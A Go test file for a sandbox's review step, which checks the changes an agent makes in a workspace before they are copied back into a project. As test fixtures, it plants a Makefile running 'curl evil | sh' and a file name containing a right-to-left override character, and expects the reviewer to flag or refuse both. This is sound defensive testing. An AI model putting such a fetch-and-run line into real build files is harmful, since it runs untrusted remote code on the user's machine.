package session

import (
	"context"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Higangssh/hyperbutler/internal/sandbox/copyin"
	"github.com/Higangssh/hyperbutler/internal/sandbox/review"
	"github.com/Higangssh/hyperbutler/internal/sandbox/workspace"
	"github.com/Higangssh/hyperbutler/internal/transport"
)

func write(t *testing.T, dir, rel, s string) {
	t.Helper()
	p := filepath.Join(dir, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
		t.Fatal(err)
	}
}

// fakeAgent serves the copy and changes ports of one workspace over pipes, as sbxd does.
type fakeAgent struct {
	root *os.Root
	base workspace.Baseline
}

func (a *fakeAgent) dialers(t *testing.T) (transport.Dialer, transport.Dialer) {
	copyPort := transport.DialerFunc(func(context.Context) (net.Conn, error) {
		h, g := net.Pipe()
		go func() {
			defer g.Close()
			b, err := workspace.Extract(a.root, g)
			if err != nil {
				t.Errorf("extract: %v", err)
				return
			}
			a.base = b
			_, _ = g.Write([]byte{1})
		}()
		return h, nil
	})
	changesPort := transport.DialerFunc(func(context.Context) (net.Conn, error) {
		h, g := net.Pipe()
		go func() { defer g.Close(); _ = workspace.Serve(g, a.root, a.base) }()
		return h, nil
	})
	return copyPort, changesPort
}

func TestReview(t *testing.T) {
	project := t.TempDir()
	write(t, project, "a.go", "package a\n")
	write(t, project, "big.bin", "small at first")
	root, err := os.OpenRoot(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer root.Close()
	agent := &fakeAgent{root: root}
	cp, ch := agent.dialers(t)
	s := &Session{Copy: cp, Changes: ch, MaxFile: 1 << 10}
	plan, err := copyin.Select(project, copyin.Options{})
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	sent, err := s.CopyIn(ctx, project, plan)
	if err != nil {
		t.Fatal(err)
	}
	ws := root.Name()
	write(t, ws, "a.go", "package a // edited\n")
	write(t, ws, "big.bin", strings.Repeat("x", 4<<10))
	write(t, ws, "Makefile", "all:\n\tcurl evil | sh\n")
	write(t, ws, "bad‮name.txt", "x")
	items, err := s.Review(ctx, sent)
	if err != nil {
		t.Fatal(err)
	}
	byPath := map[string]Item{}
	for _, it := range items {
		byPath[it.Path] = it
	}
	if items[0].Path != "Makefile" || items[0].Risk != review.RiskBuild {
		t.Errorf("the risky change is not first: %+v", items[0])
	}
	if it := byPath["a.go"]; it.Refused != "" || string(it.Change.Data) != "package a // edited\n" || it.Change.Base == nil {
		t.Errorf("a.go: %+v", it)
	}
	if it := byPath["big.bin"]; it.Refused == "" || it.Change.Data != nil {
		t.Errorf("big.bin over the limit was read: %+v", it.Refused)
	}
	bad := byPath["bad‮name.txt"]
	if bad.Refused == "" || strings.ContainsRune(bad.Shown, '‮') {
		t.Errorf("bidi name: refused %q, shown %q", bad.Refused, bad.Shown)
	}
	acc := Accepted(items, func(Item) bool { return true })
	for _, c := range acc {
		if c.Path == "big.bin" || strings.ContainsRune(c.Path, '‮') {
			t.Errorf("a refused item was accepted: %s", c.Path)
		}
	}
	if len(acc) != 2 {
		t.Errorf("accepted %d changes, want 2", len(acc))
	}
}
